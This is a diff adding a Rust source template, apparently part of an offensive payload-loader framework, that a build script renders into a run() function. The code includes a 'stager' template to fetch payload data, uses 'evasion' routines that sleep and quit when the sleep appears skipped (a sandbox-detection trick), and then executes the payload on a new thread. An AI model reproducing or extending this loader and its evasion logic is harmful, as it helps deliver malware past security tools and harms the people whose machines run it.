@@ -1,0 +1,30 @@
+// THIS FILE IS CREATED BY scripts/build.rs
+// DO NOT MODIFY BY HAND - MODIFY THE TEMPLATES INSTEAD
+use crate::{
+    evasion::{quit, time::proxied_sleep},
+    stager::{self, Stager},
+};
+use std::error::Error;
+pub fn run() -> Result<(), Box<dyn Error>> {
+    // Sleep here because we don't sleep in main.rs
+    proxied_sleep();
+    
+{%- set stager_path = "stagers/" ~ stager.name | lower ~ ".rs.j2" %}
+{%- include stager_path %}
+
+    let data = stager.get()?;
+    if proxied_sleep() {
+        quit();
+    }
+
+    let handle = std::thread::spawn(move || {
+        super::exec::target(data);
+    });
+
+    if let Err(_e) = handle.join() {
+        deprintln!("Thread panicked");
+        return Err("".into());
+    }
+
+    Ok(())
+}
